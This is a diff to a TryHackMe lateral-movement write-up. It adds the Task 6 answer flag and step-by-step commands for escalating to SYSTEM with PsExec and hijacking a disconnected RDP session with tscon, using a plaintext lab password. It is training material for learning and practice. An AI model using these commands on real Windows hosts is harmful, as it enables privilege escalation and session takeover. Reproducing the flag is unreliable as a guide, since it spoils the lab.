@@ -965,6 +965,44 @@ Follow the instructions to hijack t1_toby.beck's RDP session on THMJMP2 to get y
 
 * What flag did you get from hijacking t1_toby.beck's session on THMJMP2?
 
+    `THM{NICE_WALLPAPER}`
+
+    * Get credential from http://distributor.za.tryhackme.com/creds_t2
+    
+        ![task6-credential](./images/task6-credential.png)
+
+    * Connect to THMJMP2 via RDP
+    
+        ```
+        xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_eric.harding /p:Kegq4384
+        ```
+
+        ![task6-rdp](./images/task6-rdp.png)
+
+    * Run `cmd.exe` as Administrator and run `PsExec64.exe`
+    
+        ```
+        PsExec64.exe -s cmd.exe
+        ```
+
+        ![task6-cmd](./images/task6-cmd.png)
+
+    * Run query session
+    
+        ```
+        query user
+        ```
+
+        ![task6-query](./images/task6-query.png)
+
+    *  Hijack a session marked as disconnected (Disc) and get the flag
+    
+        ```
+        tscon 2 /dest:rdp-tcp#15
+        ```
+    
+        ![task6-flag](./images/task6-flag.png)
+
 ## Task 7 - Port Forwarding
 
 Most of the lateral movement techniques we have presented require specific ports to be available for an attacker. In real-world networks, the administrators may have blocked some of these ports for security reasons or have implemented segmentation around the network, preventing you from reaching SMB, RDP, WinRM or RPC ports.
